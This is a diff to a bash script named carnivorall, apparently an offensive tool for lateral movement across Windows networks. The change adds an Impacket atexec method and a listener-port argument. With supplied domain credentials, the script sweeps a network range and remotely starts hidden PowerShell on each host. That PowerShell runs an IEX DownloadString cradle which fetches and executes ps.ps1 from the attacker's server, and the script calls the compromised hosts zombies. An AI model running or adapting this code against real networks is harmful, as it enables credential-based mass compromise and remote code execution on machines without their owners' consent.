@@ -58,6 +58,7 @@ function banner {
         -lH, --lhost 192.168.0.1                     Local ip to receive zombies responses
         -lP, --lport 80                              Local port to listen
         -pP, --pspayload <payload.ps1>               Powershell payload file
+        -mT, --method atexec                         Use atexec.py (Default psexec.py from Impacket)
 
         Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 80 
         Ex5: ./carnivorall -lH 192.168.1.2 -lP 80 # Listen mode. 
@@ -170,6 +171,11 @@ case $KEY in
     shift 
     shift 
     ;;
+    -mT|--method)
+    METHOD="$2"
+    shift 
+    shift 
+    ;;
     --default)
     DEFAULT=YES
     shift 
@@ -214,6 +220,8 @@ LPORT="${LPORT:=$(getConfs LPORT)}"
 LFOLDER="${LFOLDER:=notset}"
 VERBOSE="${VERBOSE:=$(getConfs VERBOSE)}"
 MOUNTPOINT=$(getConfs MOUNTPOINT)
+PSEXEC=$(getConfs PSEXEC)
+METHOD="${METHOD:=$(getConfs PSEXEC)}"
 SHARESFILE=~/.carnivorall/shares.txt
 FILESFOLDER=$(getConfs FILESFOLDER)
 SMB=$(whereis smbclient |awk '{print $2}')
@@ -499,11 +507,15 @@ function executePowerShell
     PASSWORD=$3
     DOMAIN=$4
     SERVERCEC=$5
+    PORTCEC=$6
     sleep 1 
-    ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC/ps.ps1')"
-    winexe64 -U "$DOMAIN\\$USERNAME%$PASSWORD" //"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD"  2>&1 > /dev/null &
-    PIDWINEXE=$(ps ax |grep winexe64 |grep -v "grep" |awk -F" " '{print $1}' |head -n1)
-    disown $PIDWINEXE > /dev/null
+
+    if [ $METHOD == "atexec" ] ; then
+        METHOD=$(getConfs ATEXEC)
+    fi
+
+    ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC:$PORTCEC/ps.ps1')"    
+    $METHOD "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD" 2>&1 > /dev/null
 }
 
 function startZombies
@@ -513,14 +525,14 @@ function startZombies
         readarray -t IPS_FILE <<< "$(cat $LISTHOSTS | while read LINE ; do generateRange.rb $LINE; done)"
         for HOSTS in "${IPS_FILE[@]}"
             do
-                executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST &
+                executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST $LPORT 2>&1 > /dev/null &
                 sleep $DELAY
             done 
     else
         readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
         for HOSTS in "${IPS[@]}"
         do
-            executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST &
+            executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST $LPORT 2>&1 > /dev/null &
             sleep $DELAY
         done
     fi   
@@ -528,7 +540,6 @@ function startZombies
 
 function exitZombies
 {
-    killall -9 winexe64 > /dev/null
     echo -e "\n$RED............Process stopped! keep hacking =)$DEFAULTCOLOR"
     sleep 2
     kill -9 $PIDCARNIVORALL
